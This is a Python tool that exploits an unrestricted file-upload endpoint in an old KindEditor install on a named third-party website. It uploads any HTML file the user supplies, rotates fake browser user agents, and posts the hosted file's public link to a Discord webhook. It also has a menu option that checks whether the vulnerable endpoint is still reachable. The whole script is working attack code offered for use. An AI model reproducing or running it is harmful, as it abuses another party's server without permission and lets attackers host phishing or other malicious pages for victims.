import requests
import json
import re
import time
import os
import random
from datetime import datetime
from colorama import init, Fore
from pystyle import Colorate, Colors
import shutil

init(autoreset=True)

upload_url = "http://www.grand-test.com/static/kindeditor_4.1.5/php/upload_json.php?dir=file"
image_url = "https://picfiles.alphacoders.com/249/thumb-1920-249390.jpg"

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.77 Mobile Safari/537.36"
]

file_path = ""
webhook_url = ""

def log(msg, color=Fore.WHITE):
    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    print(color + f"{timestamp} {msg}")

def upload_code():
    global file_path, webhook_url

    file_path = input("Enter path to your html file ").strip()
    webhook_url = input("enter discord webhook").strip()

    if not os.path.isfile(file_path):
        log("ERROR: File not found.", Fore.RED)
        return

    headers = {
        "User-Agent": random.choice(user_agents)
    }

    log(f"Using User-Agent: {headers['User-Agent']}", Fore.GREEN)
    log("Starting to upload file", Fore.YELLOW)
    time.sleep(0.5)

    filename = os.path.basename(file_path)
    filesize = os.path.getsize(file_path) / 1024
    formatted_size = f"{filesize:.2f} KB"

    log(f"Opening file: {file_path}", Fore.YELLOW)
    files = {
        'imgFile': open(file_path, 'rb')
    }

    log("Uploading file to server", Fore.GREEN)
    response = requests.post(upload_url, headers=headers, files=files)

    if response.status_code == 200:
        log("Got response from server.", Fore.YELLOW)
        matches = re.findall(r'{.*}', response.text)
        if matches:
            result = json.loads(matches[-1])
            if result.get("error") == 0:
                url = result.get("url").replace("\\/", "/")
                full_url = "http://www.grand-test.com" + url

                log("Upload finish", Fore.GREEN)
                log(f"File URL: {full_url}", Fore.CYAN)

                if webhook_url:
                    log("Sending to webhook", Fore.YELLOW)
                    embed = {
                        "title": "upload",
                        "description": "press the url",
                        "color": 16711680,
                        "fields": [
                            {"name": "Filename", "value": filename, "inline": True},
                            {"name": "Size", "value": formatted_size, "inline": True},
                            {"name": "Uploaded At", "value": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "inline": False},
                            {"name": "URL", "value": full_url, "inline": False}
                        ],
                        "image": {"url": image_url},
                        "timestamp": datetime.utcnow().isoformat()
                    }

                    payload = {"embeds": [embed]}
                    webhook_response = requests.post(webhook_url, json=payload)

                    if webhook_response.status_code == 204:
                        log("Webhook sent successfully.", Fore.GREEN)
                    else:
                        log(f"Webhook failed Status: {webhook_response.status_code}", Fore.RED)

            else:
                log(f"Upload ERROR: {result.get('message')}", Fore.RED)
        else:
            log("Failed to parse JSON from server response.", Fore.RED)
    else:
        log(f"Upload FAILED Status: {response.status_code}", Fore.RED)

def check_site_status():
    url = "http://www.grand-test.com/static/kindeditor_4.1.5/php/upload_json.php?dir=file"
    log(f"connection to {url}", Fore.CYAN)
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            log(f"Website is UP (Status {response.status_code})", Fore.GREEN)
        else:
            log(f"Website returned status {response.status_code}", Fore.RED)
    except requests.RequestException as e:
        log(f"Website is offline {e}", Fore.RED)

    time.sleep(4)  

def main():
    while True:
    
        os.system('cls' if os.name == 'nt' else 'clear')

        logo_and_menu = '''
▄▄▌ ▐ ▄▌▄▄▄ .▄▄▄▄·  ▄ .▄      .▄▄ · ▄▄▄▄▄
██· █▌▐█▀▄.▀·▐█ ▀█▪██▪▐█▪     ▐█ ▀. •██  
██▪▐█▐▐▌▐▀▀▪▄▐█▀▀█▄██▀▐█ ▄█▀▄ ▄▀▀▀█▄ ▐█.▪
▐█▌██▐█▌▐█▄▄▌██▄▪▐███▌▐▀▐█▌.▐▌▐█▄▪▐█ ▐█▌·
 ▀▀▀▀ ▀▪ ▀▀▀ ·▀▀▀▀ ▀▀▀ · ▀█▄▀▪ ▀▀▀▀  ▀▀▀ 

1 Upload code
2 Check if server is active
3 Exit
'''

        width = shutil.get_terminal_size().columns
        centered_text = '\n'.join(line.center(width) for line in logo_and_menu.strip().split('\n'))
        print(Colorate.Horizontal(Colors.red_to_purple, centered_text))

        choice = input("> ").strip()

        if choice == "1":
            upload_code()
        elif choice == "2":
            check_site_status()
        elif choice == "3":
            log("Quitting", Fore.YELLOW)
            break
        else:
            log("error", Fore.RED)
            time.sleep(1)

if __name__ == "__main__":
    main()
